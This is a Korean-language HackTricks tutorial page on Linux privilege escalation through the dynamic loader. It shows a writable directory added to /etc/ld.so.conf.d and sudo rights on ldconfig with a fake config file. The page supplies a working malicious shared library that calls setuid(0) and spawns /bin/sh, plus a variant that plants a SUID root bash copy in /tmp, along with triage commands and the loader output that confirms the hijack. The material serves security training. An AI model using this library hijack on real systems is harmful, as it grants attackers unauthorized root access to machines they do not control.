# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## 환경 준비

다음 섹션에서 환경을 준비하는 데 사용할 파일들의 코드를 확인할 수 있습니다

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **파일들을** 동일한 폴더에서 **생성**하세요
2. **library**를 **컴파일**하세요: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`를 `/usr/lib`에 **복사**하고 cache를 refresh하세요: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **executable**을 **컴파일**하세요: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Check the environment

_check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary._
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 유용한 triage 명령

실제 target을 공격할 때, binary가 필요로 하는 **정확한 library name**과 loader가 **현재 resolving 중인 것**을 확인하세요:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
몇 가지 유용한 주의사항:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf`는 보통 **작동하지 않습니다**.  
  리다이렉션은 현재 셸에서 수행되기 때문입니다. 대신  
  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`를 사용하세요.
- **SUID/privileged** 바이너리는 **secure-execution mode**에서 `LD_LIBRARY_PATH`/`LD_PRELOAD`를 무시하지만, `/etc/ld.so.conf`에서 오는 디렉터리는 여전히 신뢰된 로더 설정의 일부이므로, 이 잘못된 설정은 여전히 privileged 프로그램에 영향을 줄 수 있습니다.
- 더 최신 glibc 버전에서는 dynamic loader가 `--list-diagnostics`도 제공하며, hijack이 예상대로 동작하지 않을 때 cache resolution과 `glibc-hwcaps` 하위 디렉터리 선택을 디버깅하는 데 유용합니다.

## Exploit

이 시나리오에서는 _/etc/ld.so.conf/_ 파일 내부에 **취약한 항목이 생성되었다고 가정**하겠습니다:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
취약한 폴더는 _/home/ubuntu/lib_입니다(여기에서 쓰기 권한이 있습니다).\
**아래 코드를** 그 경로 안에 **다운로드하고 컴파일**하세요:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
나중에 **root**(또는 다른 privileged account)가 vulnerable binary를 실행할 것으로 예상된다면, 일반적으로 interactive shell을 생성하는 것보다 **root-owned artifact**를 남겨두는 것이 더 좋습니다. 예를 들면:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
그런 다음, 권한 있는 실행이 발생한 후에는 `/tmp/rootbash -p`를 사용할 수 있습니다.

이제 **잘못 설정된** 경로 안에 악성 `libcustom` 라이브러리를 **생성**했으므로, **재부팅**을 기다리거나 root 사용자가 **`ldconfig`**를 실행할 때까지 기다려야 합니다(_이 바이너리를 **sudo**로 실행할 수 있거나 **suid bit**가 있다면 직접 실행할 수 있습니다_).

이것이 일어난 후 `sharedvuln` 실행 파일이 `libcustom.so` 라이브러리를 어디에서 로드하는지 **다시 확인**하세요:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
보시다시피, **`/home/ubuntu/lib`에서 로드**하고 있으며, 어떤 사용자가 이를 실행하면 shell이 실행됩니다:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 이 예시에서는 권한 상승을 하지는 않았지만, 실행되는 명령을 수정하고 **root 또는 다른 privileged user가 취약한 binary를 실행할 때까지 기다리면** 권한 상승을 할 수 있습니다.

### Other misconfigurations - Same vuln

이전 예시에서는 관리자가 **`/etc/ld.so.conf.d/` 내부의 configuration file 안에 non-privileged folder를 설정한** misconfiguration를 가짜로 만들었습니다.\
하지만 같은 vulnerability를 일으킬 수 있는 다른 misconfigurations도 있습니다. **`/etc/ld.so.conf.d`s` 내부의 일부 config file**, `/etc/ld.so.conf.d` 폴더, 또는 `/etc/ld.so.conf` 파일에 **write permissions**가 있다면, 같은 vulnerability를 설정하고 exploit할 수 있습니다.

## Exploit 2

**`ldconfig`에 대해 sudo privileges가 있다고 가정해 봅시다**.\
`ldconfig`에게 **conf files를 어디서 load할지 지정**할 수 있으므로, 이를 이용해 `ldconfig`가 arbitrary folders를 load하도록 만들 수 있습니다.\
그럼 "/tmp"를 load하는 데 필요한 files와 folders를 만들어 봅시다:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
이제, **이전 exploit**에서 지시한 대로 **`/tmp` 안에 악성 라이브러리를 생성**하세요.\
그리고 마지막으로, 경로를 로드하고 바이너리가 라이브러리를 어디서 로드하는지 확인해 봅시다:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**보시다시피, `ldconfig`에 대해 sudo 권한이 있으면 같은 취약점을 악용할 수 있습니다.**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
